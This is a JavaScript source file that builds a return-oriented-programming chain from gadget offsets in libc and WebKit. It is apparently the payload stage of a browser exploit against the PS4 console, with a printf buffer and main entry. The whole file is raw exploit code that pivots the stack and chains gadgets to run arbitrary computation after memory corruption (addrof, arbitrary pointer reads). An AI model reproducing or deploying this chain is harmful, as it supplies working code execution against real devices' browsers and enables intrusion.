var ropchain_array = new Uint32Array(301826);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
ropchain_offset = 2;
set_gadgets([
libc_base+763368, //pop rcx
ropchain+1048760, //rdi_bak
libc_base+533450, //mov [rcx], rdi
libc_base+144605, //pop rdi
ropchain+1048720, //stack_bottom
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
ropchain+112, //ret_addr
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1175176, //_main
//ret_addr:
libc_base+782311, //pop rsp
ropchain+1048720 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
ropchain_offset = 32;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 262144;
//stack_bottom:
set_gadgets([
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
main_ret,
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1048840, //L0
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L0:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1048952, //L3
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1048968, //L4
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L2:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L3:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L4:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1049056, //L6
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1049072, //L7
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L7:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1049232, //L12
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1049184, //L9
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1049200, //L10
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L9:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L10:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L11:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1049288, //L13
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L13:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1049400, //L15
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1049432, //L17
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1049416, //L16
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L15:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1049592, //L21
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1049544, //L18
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1049560, //L19
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L18:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L19:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L20:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1049696, //L23
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1049680, //L22
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1049904, //L28
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1049872, //L26
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L26:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L27:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1050008, //L30
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1049992, //L29
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1050104, //L32
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L31:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L32:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1050192, //L34
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1050208, //L35
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L35:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1050368, //L40
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1050320, //L37
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1050336, //L38
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L37:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L38:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L39:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1050424, //L41
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L41:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1050536, //L43
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1050568, //L45
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1050552, //L44
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L43:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1050728, //L49
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1050680, //L46
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1050696, //L47
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L46:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L47:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L48:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1050832, //L51
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1050816, //L50
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1051032, //L56
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1051000, //L54
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L54:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L55:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1051136, //L58
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1051120, //L57
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1051248, //L61
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1051216, //L59
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L59:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L60:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1051312, //L63
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+763368 //pop rcx
]);
//L63:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1051368, //L64
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L64:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760, //pop rsi
ropchain+1051520, //L67
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1051536, //L68
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1051504, //L66
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L66:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1051664, //L70
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1051680, //L71
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1051648, //L69
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1051784, //L72
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1051800, //L73
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1051920, //L74
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1051904, //L75
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1052008, //L77
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1051992, //L76
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1052112, //L78
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1052128, //L79
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1052248, //L80
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1052232, //L81
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1052320, //L82
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L82:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1052432, //L85
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1052448, //L86
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L84:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L85:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L86:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1052536, //L88
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1052552, //L89
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L89:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1052712, //L92
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1052744, //L94
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1052696, //L91
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1052728, //L93
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L92:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1052840, //L96
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1052824, //L95
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+763368,); //pop rcx
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1053040, //L101
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1053008, //L99
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L99:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L100:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1053144, //L103
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1053128, //L102
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848080, //shr rax, cl
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1053248, //L105
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L104:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1053336, //L107
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1053352, //L108
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L108:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1053512, //L111
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1053544, //L113
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1053496, //L110
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1053528, //L112
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L111:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1053640, //L115
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1053624, //L114
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L117:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1053752, //L118
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L118:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14664103, //and rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1053984, //L124
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1053952, //L122
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L122:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L123:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1054088, //L126
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1054072, //L125
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1054144, //L128
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1054200, //L129
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L129:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1054328, //L132
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L131:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1054416, //L134
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1054432, //L135
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L135:
db([0, 0]); // 0x0
